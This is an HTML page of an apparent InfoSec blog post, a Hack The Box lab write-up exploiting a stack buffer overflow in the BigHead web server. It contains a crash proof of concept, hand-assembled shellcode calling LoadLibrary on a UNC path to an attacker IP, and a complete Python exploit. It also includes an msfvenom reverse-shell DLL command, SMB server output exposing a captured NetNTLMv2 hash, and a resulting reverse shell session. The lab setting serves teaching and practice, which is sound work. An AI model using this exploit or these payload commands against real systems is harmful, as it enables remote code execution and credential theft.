@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> HTB BigHead Exploit - Small Buffer Exploit without Egghunter &middot; InfoSec Blog </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.1" />
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="http://mislusnys.github.io/css/nix.css">
+
+
+
+<link rel="shortcut icon" href="/favicon.ico">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=http://mislusnys.github.io/>ms@blog ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="http://mislusnys.github.io/">/home/ms</a>
+				</li>
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="/post">~/posts</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="http://mislusnys.github.io/post/htb-bighead/">HTB BigHead Exploit - Small Buffer Exploit without Egghunter</a></h1>
+            <span class="post-date">May 4, 2019 </span>
+            <div class="post-content">
+                <p>This post will demonstrate one of a few ways to deal with small buffer space when exploiting buffer overflows on Windows. This is not a full writeup of the BigHead machine and only demonstrates the initial buffer overflow exploit using the LoadLibrary function.</p>
+
+<p>Normally, when exploiting buffer overflows on Windows (no DEP) we just cram the shellcode into the buffer itself and find a way to jump to it.
+If the buffer space is too small to fit the entire shellcode, then a technique called &ldquo;egg hunting&rdquo; comes into play.
+Using this technique a very small 32-40 byte shellcode is used. This code only searches the vulnerable program&rsquo;s memory for the bigger shellcode and jumps to it. It&rsquo;s a technique that&rsquo;s quite universal and works well in most situations.</p>
+
+<p>However, in certain favorable circumstances we can exploit Windows programs in a way which is similar to the Linux <code>system('/bin/sh')</code> one liner.</p>
+
+<p>There are a couple of ways to achieve that:</p>
+
+<ol>
+<li>WinExec(), system() and other similar functions</li>
+<li>LoadLibrary()</li>
+</ol>
+
+<p>In order to use any of these functions within a small buffer space, they need to be already imported by the vulnerable program.</p>
+
+<p>In the case of BigHead Web Server, the <code>LoadLibrary</code> function is imported both by the executable itself and <code>bHeadSvr.dll</code>.</p>
+
+<p>So, in short, to achieve a one API call RCE with LoadLibrary we need to load a dll from a UNC path like this:</p>
+
+<pre><code>LoadLibrary('\\attacker_ip\payload.dll')
+</code></pre>
+
+<p>The only requirement for this to work is that anonymous SMB outbound traffic needs to be allowed. Which is also true for the BigHead box.</p>
+
+<h2 id="quick-summary">Quick Summary</h2>
+
+<p>Let&rsquo;s follow these steps to produce a working exploit using the <code>LoadLibrary()</code> technique:</p>
+
+<ul>
+<li>Identify the web server running on the box</li>
+<li>Analyze web server binary for vulnerabilities</li>
+<li>Set up a test server behind nginx</li>
+<li>Create a Proof of Concept exploit to crash the test server</li>
+<li>Create an exploit to get a shell on the test server</li>
+<li>Exploit the BigHead box</li>
+</ul>
+
+<h2 id="detailed-steps">Detailed Steps</h2>
+
+<h3 id="identify-the-web-server-running-on-the-box">Identify the web server running on the box</h3>
+
+<p>Using the standard enumeration techniques we identify a custom web server running on the <code>dev.bighead.htb</code> VHOST on our target. Using some light OSINT we realize that the server binaries are actually hosted on github: <a href="https://github.com/3mrgnc3/BigheadWebSvr">https://github.com/3mrgnc3/BigheadWebSvr</a>. We download the commit which has the exe file inside and crack the zip password to extract <code>BigheadWebSvr.exe</code>, <code>bHeadSvr.dll</code> and <code>nginx.conf</code> files.</p>
+
+<h3 id="analyze-web-server-binaries-for-vulnerabilities">Analyze web server binaries for vulnerabilities</h3>
+
+<p>Reversing the web server executable we identify a potential vulnerabilty in the HTTP HEAD method handling code. The server upon receiving the <code>HEAD /payload</code> request, hex decodes the payload part and passes it to <code>Function4()</code> which in turn executes a strcpy() function and is therefore vulnerable to stack based buffer overflow.</p>
+
+<p><img src="/images/ida_func4.png" alt="Vuln Function" /></p>
+
+<h3 id="set-up-a-test-server-behind-nginx">Set up a test server behind nginx</h3>
+
+<p>The vulnerable server on the BigHead box is actually only exposed via nginx reverse proxy.
+Therefore, in order to properly exploit the server we need to set up a test environment similar to the one found on the box.
+The requests that will reach our vulnerable server will be forwarded from nginx, so we need to first understand how do they look like.
+We use the extracted nginx.conf file to run nginx reverse proxy on Kali and see how a sample request looks like coming from nginx and going towards the BigHeadWebSvr binary.</p>
+
+<p>We send a sample request:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~/ctf/htb/bighead# nc <span style="color:#ae81ff">127</span>.0.0.1 <span style="color:#ae81ff">80</span>
+HEAD /test HTTP/1.1
+Host: dev.bighead.htb
+
+^C</code></pre></div>
+<p>On the other side it comes out:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~# nginx -c nginx.conf
+root@kali:~# nc -lvp <span style="color:#ae81ff">8008</span>
+Ncat: Version <span style="color:#ae81ff">7</span>.70 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+Ncat: Listening on :::8008
+Ncat: Listening on <span style="color:#ae81ff">0</span>.0.0.0:8008
+Ncat: Connection from <span style="color:#ae81ff">127</span>.0.0.1.
+Ncat: Connection from <span style="color:#ae81ff">127</span>.0.0.1:48072.
+HEAD /test HTTP/1.1
+Host: <span style="color:#ae81ff">127</span>.0.0.1:8008
+Connection: close</code></pre></div>
+<h3 id="create-a-proof-of-concept-exploit-to-crash-the-test-server">Create a Proof of Concept exploit to crash the test server</h3>
+
+<p>We change the nginx.conf <code>proxy_pass</code> to point to our Windows VM running the <code>BigHeadWebSvr.exe</code> server at <code>http://172.16.14.62:8008;</code>.
+And then create the following exploit skeleton to crash the binary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> socket
+
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>
+
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
+
+head <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HEAD /&#34;</span> <span style="color:#f92672">+</span> buf <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+head <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Host: dev.bighead.htb</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+head <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+head <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+s<span style="color:#f92672">.</span>connect((host, port))
+s<span style="color:#f92672">.</span>send(head)
+<span style="color:#66d9ef">print</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>close()</code></pre></div>
+<p>The server crashes:</p>
+
+<p><img src="/images/bighead_crash.png" alt="Crash" /></p>
+
+<p>Then, we attach the debugger to inspect the crash closer:</p>
+
+<p><img src="/images/bighead_eip.png" alt="EIP" /></p>
+
+<p>We can see a couple of interesting pieces of information here:</p>
+
+<ol>
+<li>The payload is hexlified, so the &ldquo;AA&rdquo; becomes 0xAA and not 0x41,0x41, this makes it a bit harder to search for EIP offset using mona.py</li>
+<li>Our payload is cleanly referenced in the EAX register, so any JMP EAX, CALL EAX or similar instruction will land us into our payload</li>
+</ol>
+
+<p>After a few tries we find the correct offset and the size of our buffer (the size limitation is very important for the steps that will follow):</p>
+
+<p><code>buf = &quot;aa&quot; * 36 + &quot;bbbbbbbb&quot; + &quot;cc&quot; * 38</code></p>
+
+<p>Now <code>EIP</code> is cleanly overwritten with <code>0xBBBBBBBB</code>:</p>
+
+<p><img src="/images/bighead_clean_eip.png" alt="EIP" /></p>
+
+<p>Now using <code>mona</code> we find suitable instructions to jump to EAX address:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">0BADF00D   [+] Command used:
+0BADF00D   !mona jmp -r eax
+
+&lt;...snip...&gt;
+
+0BADF00D   [+] Results :
+00402AF3     0x00402af3 : jmp eax | startnull {PAGE_EXECUTE_READ} [BigheadWebSvr.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\tmp\BHWS_Backup\BigheadWebSvr.exe)
+625012F2     0x625012f2 : jmp eax |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\tmp\BHWS_Backup\bHeadSvr.dll)
+64552F19     0x64552f19 : jmp eax | asciiprint,ascii {PAGE_EXECUTE_READ} [libmingwex-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\tmp\BHWS_Backup\libmingwex-0.dll)
+64552F44     0x64552f44 : jmp eax | asciiprint,ascii {PAGE_EXECUTE_READ} [libmingwex-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\tmp\BHWS_Backup\libmingwex-0.dll)
+64552F89     0x64552f89 : jmp eax |  {PAGE_EXECUTE_READ} [libmingwex-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\tmp\BHWS_Backup\libmingwex-0.dll)
+004010A1     0x004010a1 : call eax | startnull {PAGE_EXECUTE_READ} [BigheadWebSvr.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\tmp\BHWS_Backup\BigheadWebSvr.exe)
+
+&lt;...snip...&gt;
+
+0BADF00D   [+] Done. Only the first 20 pointers are shown here. For more pointers, open jmp.txt...
+0BADF00D       Found a total of 28 pointers
+0BADF00D
+0BADF00D   [+] This mona.py action took 0:00:00.719000</code></pre></div>
+<p>We choose a dll address (which has no null bytes): <code>0x625012f2</code></p>
+
+<p>Now when we replace the <code>BBBBBBBB</code> with <code>f2125062</code> (little endian, hexlified) - we will overwrite EIP with the address of <code>jmp eax</code> and this jump will redirect program execution to the start of our buffer.</p>
+
+<h3 id="create-an-exploit-to-get-a-shell-on-the-test-server">Create an exploit to get a shell on the test server</h3>
+
+<p>Now in order to get a shell, all we need to do is execute <code>LoadLibrary('\\IP\payload.dll')</code>.</p>
+
+<p>First we find the <code>LoadLibrary()</code> address in the <code>bHeadSvr.dll</code>:</p>
+
+<p><img src="/images/bighead_loadlib.png" alt="LoadLibrary" /></p>
+
+<p>The address is <code>0x62501B58</code>.</p>
+
+<p>Next, we need to load the string <code>\\IP\payload.dll</code> or in our test case <code>\\10.10.14.27\share\x.dll</code> into EAX and call the previously found address.</p>
+
+<p>One thing that we notice is that whatever we put in our buffer AFTER the EIP offset is actually 0x0 terminated, which is perfect for us as it simplifies getting the address of our string into the EAX. So, when we start executing our shellcode the EAX points to the start of our buffer and the UNC address string is  where the <code>c's</code> start in our POC:</p>
+
+<p><code>buf = &quot;aa&quot; * 36 + &quot;bbbbbbbb&quot; + &quot;cc&quot; * 38</code>.</p>
+
+<p>This means that the UNC string is at 36 + 4 = 40 (0x28 hex) bytes from the start of our buffer. Since EAX already holds the address of our buffer, we only need to add 0x28 to it to have our string&rsquo;s address in there.</p>
+
+<p>We create a small asm shellcode:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">load_lib <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\x28</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># add ah, 28h</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                      <span style="color:#75715e"># push eax ; EAX now points to the smb string</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xBB\x58\x1B\x50\x62</span><span style="color:#e6db74">&#34;</span>      <span style="color:#75715e"># mov ebx, 62501B58h ; Load EBX with the address of LoadLibrary</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFF\xD3</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># call ebx ; Call LoadLibrary()</span></code></pre></div>
+<p>We use <code>add ah, 28h</code> instead of <code>add eax, 28h</code> here to avoid null bytes and shorten the code as much as possible.</p>
+
+<p>So the final exploit becomes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>
+<span style="color:#f92672">import</span> socket
+<span style="color:#f92672">import</span> binascii
+
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>
+
+load_lib <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\x28</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># add ah, 28h</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                      <span style="color:#75715e"># push eax ; EAX now points to the smb string</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xBB\x58\x1B\x50\x62</span><span style="color:#e6db74">&#34;</span>      <span style="color:#75715e"># mov ebx, 62501B58h ; Load EBX with the address of LoadLibrary</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFF\xD3</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># call ebx</span>
+
+smb <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">10.10.14.27</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">share</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x.dll&#34;</span>
+
+load_lib <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(load_lib)
+smb <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(smb)
+
+jmp_eax <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;F2125062&#39;</span>
+align_esp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;505C&#39;</span> <span style="color:#75715e"># push eax, pop esp</span>
+buf <span style="color:#f92672">=</span>  align_esp <span style="color:#f92672">+</span> load_lib <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;90&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> jmp_eax <span style="color:#f92672">+</span> smb
+head <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HEAD /&#34;</span> <span style="color:#f92672">+</span> buf <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+head <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Host: dev.bighead.htb</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+head <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+head <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+s<span style="color:#f92672">.</span>connect((host, port))
+s<span style="color:#f92672">.</span>send(head)
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>close()</code></pre></div>
+<p>Putting the breakpoint on JMP EAX instruction, running our exploit against the test server and jumping into the buffer we get:</p>
+
+<p><img src="/images/bighead_sc.png" alt="Shellode" /></p>
+
+<p>Stepping through the instructions we see that everythings works perfectly!</p>
+
+<h3 id="exploit-the-bighead-box">Exploit the BigHead box</h3>
+
+<p>Now we change our target IP to the BigHead box (10.10.10.112), generate our dll payload and run our exploit.</p>
+
+<p>Generate the dll payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.10.14.27 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f dll -o /tmp/x.dll</code></pre></div>
+<p>Serving this dll with impacket&rsquo;s SMB server and running our exploit against the target:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~# python /usr/share/doc/python-impacket/examples/smbserver.py SHARE /tmp
+Impacket v0.9.18 - Copyright <span style="color:#ae81ff">2018</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Incoming connection <span style="color:#f92672">(</span><span style="color:#ae81ff">127</span>.0.0.1,54224<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> AUTHENTICATE_MESSAGE <span style="color:#f92672">(</span>PIEDPIPER<span style="color:#ae81ff">\N</span>elson,PIEDPIPER<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> User Nelson<span style="color:#ae81ff">\P</span>IEDPIPER authenticated successfully
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Nelson::PIEDPIPER:4141414141414141:2af65562d1132c80bc7efe34d19995a1:010100000000000080bad4d617ead40194578ebe843541430000000001001000650055005700630050004f005a006a0002001000550054004700630064004b004d00520003001000650055005700630050004f005a006a0004001000550054004700630064004b004d0052000700080080bad4d617ead40106000400020000000800300030000000000000000000000000200000161c779cadb5b7efab3d2f3e700187b0f5b695485a01b518fac14222bfb5db1a000000000000000000000000</code></pre></div>
+<p>And we receive a reverse shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ sudo nc -lvp <span style="color:#ae81ff">443</span>
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> ms:
+Listening on <span style="color:#f92672">[</span><span style="color:#ae81ff">0</span>.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family <span style="color:#ae81ff">0</span>, port <span style="color:#ae81ff">443</span><span style="color:#f92672">)</span>
+Connection from bighead.htb <span style="color:#ae81ff">49160</span> received!
+Microsoft Windows <span style="color:#f92672">[</span>Version <span style="color:#ae81ff">6</span>.0.6002<span style="color:#f92672">]</span>
+Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2006</span> Microsoft Corporation.  All rights reserved.
+
+C:<span style="color:#ae81ff">\n</span>ginx&gt;whoami &amp; hostname
+whoami &amp; hostname
+piedpiper<span style="color:#ae81ff">\n</span>elson
+PiedPiper
+
+C:<span style="color:#ae81ff">\n</span>ginx&gt;</code></pre></div>
+<p>Thanks for reading!</p>
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>Copyright &copy; 2019  -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+    </body>
